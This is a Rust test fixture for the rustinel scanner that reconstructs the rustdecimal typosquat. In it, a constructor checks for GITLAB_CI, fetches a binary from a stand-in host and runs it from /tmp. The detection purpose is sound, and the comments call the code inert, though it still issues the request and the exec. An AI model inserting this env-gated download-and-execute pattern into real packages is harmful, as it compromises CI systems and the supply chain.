// Fixture only — a reconstruction of the rustdecimal typosquat (crates.io, 2022).
// rustinel reads this statically and must NEVER execute it. The code is inert
// (no real logic).
//
// The real rustdecimal impersonated `rust_decimal`; its `Decimal::new` checked the
// GITLAB_CI environment variable and, when set, downloaded a binary to /tmp and
// executed it. rustinel flags the env-gated download-and-execute pattern from a
// static read — before any advisory exists.

pub fn new() {
    if std::env::var("GITLAB_CI").is_ok() {
        // Fetch a remote payload (inert here).
        let _resp = reqwest::blocking::get("http://example.invalid/git-updater.bin");
        // ...write it to /tmp and execute it.
        let _status = std::process::Command::new("/tmp/git-updater.bin").status();
    }
}
